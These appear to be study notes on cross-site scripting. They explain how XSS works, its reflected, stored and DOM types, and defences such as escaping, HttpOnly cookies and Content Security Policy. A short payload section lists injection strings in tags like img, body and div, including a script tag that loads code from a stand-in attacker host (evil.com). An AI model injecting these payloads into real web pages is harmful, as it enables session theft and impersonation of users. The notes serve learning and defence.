# Cross Site Scripting (XSS) 
XSS is one of most common and dangerous types of vulnerabilities in web apps. It can lead to stolen of modified user data! XSS is a client-side code injection technizue where attacker executes malicious scripts by inserting code into a legit and trusted web page or web app. 

### Where does XSS Occur?
On web pages and web apps. Common vulnerable vehicles to deliver malicious scripts include forums, message boards, and web pages that allow comment. 

### Who is Vulnerable to XSS?
Any web page or app that uses **unsanitized** user input in the output it generates. 

### How Does XSS Work?
XSS attacks are possible in VBScript, ActiveX, Flash, and even CSS. Most common in Javasript b/c JS is fundamental to most browsing experiences. 

- Vulnerable website needs to directly include user input in it's pages. Attacker inserts malicious string that is treated as source code by victim's browser. When victim's page loads, malicious code is executed. 

No difference between HTML code that needs to be rendered, and input we sent out. Browser acceptsout input without realizing that there's a script.


### What Damage Can XSS Cause ?
Malicious JS can access to all object that web page has access to
- Session cookies. Attacker can impersonate user, perform actions of behalf of user, and gain access to user's sensitive data. 
- JS can read browser DOM and modify it. 
- JS cann use XMLHttpRequest object to send HTTP requiest with arbitrary content to arbitrary destinations 
- JS can use HTML5 APIs to access geolocation, webcase, microphone, and even specific files 
- Js can edit page styles
- Clickjacking (tricking user into clicking something different from what user perceives)
- Autofill / keychain data

#### Same Origin Policy 
A policy that stops one website from reading or writing data to another. Checks for three things: *Protocol, Host, Port* 

## XSS Attack Vectors 
[List of attack vectors](https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45)
### <script> tag 
Most straightforward XSS payload. Can reference external JS cde or can embed code within script tage itself. 
`<script src=http://evil.com/xss.js></script>`
`<script> alert("wahoo gotcha"); </script>`

### JS Events 
`<body onload=alert("XSS")>`

### `<body>` tag 
`<body background="javascript:alert("XSS")>`

### `<img>` tag 
`<img src="javascript:alert("XSS");">`

### `<input>` tag
`<input type="image" src="javascript:alert('XSS');">`


### `<link>` tag 
`<link rel="stylesheet" href="javascript:alert('XSS');">`

### `<table>` tag 
`<table background="javascript:alert('XSS')">`

### `<div>` tag 
`<div style="background-image: url(javascript:alert('XSS'))">`

# Types of XSS

### Refelcted XSS 
AKA "non-persistent attacks." A common type of XSS attack where input is reflected back in response. Only requires that malicious script be embedded into a link. Do not typically have the same reach as stored XSS attacks. 

### Stored XSS 
AKA "persistent attacks" tends to have more reach than reflected xss because unsanitized input stored in database. Attacker can exploit this by entering malicious code into publicly requestable resource that victim runs. 

### DOM XSS
Rarest type of xss attack becuase easiest to defend against (using templates provided in JS frameworks prevents this vulnerability). Happens entirely on client-side. User's input lands directly inside dangerous part of JS code. Attackers exploit URI fragments (pieuce of url after `#`)

# How to Prevent XSS
Bottom line: Sanitize your input
- **Train and Maintain Awareness:** Be aware of the risks 
- **Distrust User Input:** Treat all user input as untrusted, including input from authenticated and/or internal users
- **Escape/Encode:** Use appropriate escaping/ encoding techniques. Use existing libraries for escaping, don't write your own unless absolutely necessary
- **Sanitize:** Use trusted verified library to pare and clean HTML if input needs to contain HTML b/c escaping/encoding would break valid tags
- **HTTP Only Flag:** Set HttpOnly flag for cookies so they arent accessible via client-side JS
- **Content Security Policy:** Use content security policy (CSP), an HTTP response header that lets you declare dynamic resources that are allowed to load dependinng on request soruce. 

# Resources 
- https://www.acunetix.com/websitesecurity/cross-site-scripting/
- https://www.acunetix.com/blog/articles/preventing-xss-attacks/
- https://xss-game.appspot.com/